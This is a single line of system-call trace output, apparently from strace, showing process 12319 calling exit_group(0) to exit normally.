12319 07:41:51.019458 exit_group(0)     = ?
